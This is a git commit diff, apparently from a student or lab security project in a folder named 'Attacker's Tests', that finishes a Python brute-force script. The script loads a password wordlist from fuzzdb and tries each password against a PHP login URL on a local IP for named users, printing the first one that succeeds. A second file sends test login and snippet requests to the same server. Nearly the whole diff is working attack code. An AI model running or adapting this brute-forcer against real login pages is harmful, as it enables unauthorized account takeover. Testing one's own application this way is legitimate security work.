2215dbfd57a4ed73159d0c406155fb98b933289d
root <root@localhost.localdomain>
2017-01-13 13:02:30 +0000

    completing brute force

--- Attacker's Tests/Simple Brute Forcer/bruteforcer.py
+++ Attacker's Tests/Simple Brute Forcer/bruteforcer.py
@@ -1,15 +1,22 @@
 import requests
 
-blaaaah =['hi','bye']
+f = open('fuzzdb/wordlists-user-passwd/passwds/john.txt','r')
+
+x = []
+for pwd in f.xreadlines():
+    x.append(pwd)
+
 
 def brute_forcer(username):
-        for i in blaaaah:
-            url = 'http://192.168.0.42/controller/controller_login.php?username='+username+'&password='+i
-            r = requests.get(url)
-            if 'abc' in r.text:
-                continue
-            else:
-                print i
-                break
+    for i in x:
+        i = i[:-1]
+        url = 'http://192.168.0.42/controller/controller_login.php?username='+username+'&password='+i
+        #print url
+        r = requests.get(url)
 
-brute_forcer("maya")
+        if 'abc' not in r.text :
+            print i
+            break
+
+
+brute_forcer('mike')
--- Attacker's Tests/browser.py
+++ Attacker's Tests/browser.py
@@ -3,6 +3,13 @@ import requests
 r = requests.get('http://192.168.0.42/controller/controller_login.php?username=maya&password=hi')
 s = requests.get('http://192.168.0.42/model/model_home.php?username=maya&snippet=yoyoyoy&isPublic=0')
 print s.status_code
+
+url = 'http://192.168.0.42/controller/controller_login.php?username='+'maya'+'&password='+'hi'
+r = requests.get(url)
+if 'abc' in r.text:
+    print 'nope'
+else:
+    print 'yes'
 # if "blah" in "blahaaaaa":
 #     print 'woo'
 # if 'abc' in r.text:
